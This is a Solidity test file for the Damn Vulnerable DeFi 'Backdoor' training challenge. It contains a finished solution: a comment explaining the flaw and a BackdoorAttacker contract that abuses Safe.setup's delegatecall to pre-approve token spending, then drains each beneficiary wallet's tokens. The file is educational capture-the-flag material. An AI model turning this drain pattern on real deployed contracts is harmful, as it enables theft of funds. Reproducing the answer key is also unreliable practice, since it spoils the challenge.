// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * Safe.setup() allows executing a delegatecall to any address during wallet initialization
         * via the `to` and `data` parameters. The WalletRegistry doesn't validate these parameters.
         *
         * The delegatecall runs in the context of the new wallet, so we can:
         * 1. Create a helper contract that approves tokens for our attacker
         * 2. During wallet setup, delegatecall to the helper to approve our attacker
         * 3. Registry validates wallet and transfers 10 DVT to it
         * 4. Our attacker can immediately transferFrom the DVT since it was pre-approved
         *
         * EXPLOIT STRATEGY:
         * 1. Deploy attacker contract
         * 2. For each beneficiary, create Safe wallet with malicious setup data
         * 3. The setup delegatecalls to approve attacker for token spending
         * 4. Registry sends tokens to wallet, attacker drains them to recovery
         */

        // Deploy the attacker which handles everything
        new BackdoorAttacker(
            walletFactory,
            address(singletonCopy),
            walletRegistry,
            token,
            users,
            recovery
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

/**
 * @notice Helper contract called via delegatecall during Safe setup to approve tokens
 */
contract TokenApprover {
    function approve(address token, address spender, uint256 amount) external {
        DamnValuableToken(token).approve(spender, amount);
    }
}

/**
 * @notice Attacker contract that creates backdoored Safe wallets for all beneficiaries
 */
contract BackdoorAttacker {
    constructor(
        SafeProxyFactory walletFactory,
        address singletonCopy,
        WalletRegistry walletRegistry,
        DamnValuableToken token,
        address[] memory beneficiaries,
        address recovery
    ) {
        // Deploy the helper that will be delegatecalled during setup
        TokenApprover approver = new TokenApprover();

        // For each beneficiary, create a backdoored wallet
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address beneficiary = beneficiaries[i];

            // Build the owners array (single owner as required)
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            // Build the malicious setup data that will approve this contract
            bytes memory approveData = abi.encodeCall(
                TokenApprover.approve,
                (address(token), address(this), type(uint256).max)
            );

            // Encode the full Safe.setup call
            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,            // _owners
                    1,                 // _threshold
                    address(approver), // to - delegatecall target
                    approveData,       // data - delegatecall data
                    address(0),        // fallbackHandler - must be 0
                    address(0),        // paymentToken
                    0,                 // payment
                    payable(address(0)) // paymentReceiver
                )
            );

            // Create the proxy with callback to registry
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                singletonCopy,
                initializer,
                0,  // saltNonce
                walletRegistry
            );

            // At this point, the wallet has approved us and has 10 DVT
            // Transfer tokens to recovery
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
